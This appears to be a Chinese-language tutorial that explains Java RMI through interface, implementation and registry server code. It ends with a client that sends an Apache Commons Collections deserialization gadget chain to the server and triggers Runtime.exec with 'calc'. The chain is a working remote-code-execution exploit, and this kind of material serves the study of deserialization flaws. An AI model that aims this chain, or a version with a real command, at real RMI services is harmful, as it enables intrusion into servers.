## 概述

RMI(Remote Method Invocation) ：远程方法调用

它使客户机上运行的程序可以通过网络实现调用远程服务器上的对象，要实现`RMI`，客户端和服务端需要共享同一个接口

## 示例

1. 一个可以远程调用的接口，实现了**Remote**接口

```java
package pers.rmi;

import java.rmi.Remote;
import java.rmi.RemoteException;

//定义一个能够远程调用的接口，并且需要扩展Remote接口
public interface RemoteInterface extends Remote {
    public String CaseBegin() throws RemoteException;
    public String CaseBegin(Object demo) throws RemoteException;
    public String CaseOver() throws RemoteException;
}
```



2. 实现了接口的类

```java
package pers.rmi;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

//远程可以调用的类，需要继承UnicastRemoteObject类和实现RemoteInterface接口

//也可以指定需要远程调用的类，可以使用UnicastRemoteObject类中的静态方法exportObject指定调用类
public class RemoteObject extends UnicastRemoteObject implements RemoteInterface {
    protected RemoteObject() throws RemoteException {
        super();
    }

    @Override
    public String CaseBegin() {
        return "Hello world!";
    }

    @Override
    public String CaseBegin(Object demo) {
        return demo.getClass().getName();
    }

    @Override
    public String CaseOver() {
        return "Good bye!";
    }
}

```

3. 远程服务端，其中附带了注册中心

```java
package pers.rmi;

import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RemoteServer {
    public static void main(String[] args) throws RemoteException, MalformedURLException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        //将需要调用的类进行绑定
        //创建远程类
        RemoteObject remoteObject = new RemoteObject();
        //获取注册中心
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        //绑定类
        registry.bind("test", remoteObject);
    }
}

```

4. 使用RMI客户端触发CC链漏洞

```java
package pers.rmi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.*;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class RMIClientAttackDemo1 {
    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, AlreadyBoundException, NoSuchFieldException {

        //仿照ysoserial中的写法，防止在本地调试的时候触发命令
        Transformer[] faketransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Class[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
                new ConstantTransformer(1),
        };
        Transformer transformerChain = new ChainedTransformer(faketransformers);
        Map innerMap = new HashMap();
        Map outMap = LazyMap.decorate(innerMap, transformerChain);

        //实例化
        TiedMapEntry tme = new TiedMapEntry(outMap, "key");
        Map expMap = new HashMap();
        //将其作为key键传入
        expMap.put(tme, "value");

        //remove
        outMap.remove("key");

        //传入利用链
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        Object o = (Object) expMap;

        // 获取远程对象实例
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        RemoteInterface stub = (RemoteInterface) registry.lookup("test");
        System.out.println(stub.CaseBegin(o));
    }
}
```

